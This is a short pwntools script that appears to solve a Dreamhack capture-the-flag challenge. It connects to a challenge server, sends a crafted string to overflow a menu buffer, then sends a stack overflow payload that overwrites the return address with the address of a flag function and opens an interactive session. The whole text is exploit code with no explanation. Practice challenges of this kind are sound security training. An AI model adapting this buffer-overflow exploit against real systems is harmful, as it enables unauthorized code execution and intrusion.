from pwn import *
p=remote("host3.dreamhack.games", 16430)
cherry = b"cherry" + b"A" * 0x6 + b"Z"
p.sendlineafter(b"Menu: ", cherry)
flag=0x4012bc

payload=b"a"*0x1a+p64(flag)

print(payload)

p.sendlineafter(b"Is it cherry?: ", payload)

p.interactive()
